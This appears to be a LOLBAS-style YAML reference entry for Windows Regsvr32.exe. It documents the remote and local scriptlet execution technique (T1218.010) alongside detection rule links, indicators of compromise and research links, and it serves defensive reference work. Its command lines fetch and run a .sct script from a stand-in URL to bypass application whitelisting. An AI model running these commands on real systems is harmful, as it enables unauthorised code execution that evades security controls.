---
Name: Regsvr32.exe
Description: Used by Windows to register dlls
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    Description: Execute the specified remote .SCT script with scrobj.dll.
    Usecase: Execute code from remote scriptlet, bypass Application whitelisting
    Category: AWL bypass
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
    Description: Execute the specified local .SCT script with scrobj.dll.
    Usecase: Execute code from scriptlet, bypass Application whitelisting
    Category: AWL bypass
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
    Description: Execute the specified remote .SCT script with scrobj.dll.
    Usecase: Execute code from remote scriptlet, bypass Application whitelisting
    Category: Execute
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
    Description: Execute the specified local .SCT script with scrobj.dll.
    Usecase: Execute code from scriptlet, bypass Application whitelisting
    Category: Execute
    Privileges: User
    MitreID: T1218.010
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\regsvr32.exe
  - Path: C:\Windows\SysWOW64\regsvr32.exe
Code_Sample:
 - Code:
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/6fbce11094285e5ba13fe101b9cb70f5b1ece198/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/6d56e400d209daa77a7900d950a7c587dc0cd2e5/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/5951ad1d9a781a49d61df9af03c7b83ac67a0012/rules/windows/dns_query/dns_query_regsvr32_network_activity.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_regsvr32_flags_anomaly.yml
  - Sigma: https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/file_event/sysmon_susp_clr_logs.yml
  - Splunk: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml
  - Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
  - Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml
  - IOC: regsvr32.exe retrieving files from Internet
  - IOC: regsvr32.exe executing scriptlet (sct) files
  - IOC: DotNet CLR libraries loaded into regsvr32.exe
  - IOC: DotNet CLR Usage Log - regsvr32.exe.log
Resources:
  - Link: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
  - Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
Acknowledgement:
  - Person: Casey Smith
    Handle: '@subtee'
---
